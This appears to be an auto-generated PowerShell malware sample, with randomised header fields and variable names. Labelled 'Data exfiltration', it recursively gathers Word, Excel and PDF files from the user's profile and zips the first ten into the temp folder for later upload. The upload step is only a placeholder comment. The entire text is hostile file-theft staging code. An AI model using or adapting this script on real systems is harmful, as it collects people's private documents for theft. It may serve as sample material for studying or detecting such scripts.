# HdwVm0T5mbXLUNxBMkj2
# Generated: 2025-11-03T12:20:52.709885
# System: EQtFMdH7yAoCYnx
# Process: Vo07O48teXEs


# Data exfiltration
$sensitiveFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -Include *.doc, *.docx, *.pdf, *.xls, *.xlsx -ErrorAction SilentlyContinue | Select-Object -First 10

if ($sensitiveFiles) {
    $sMgHAcUKZip = "$env:TEMP\data.zip"
    Compress-Archive -Path $sensitiveFiles.FullName -DestinationPath $sMgHAcUKZip -Force
    # Upload logic would go here
}
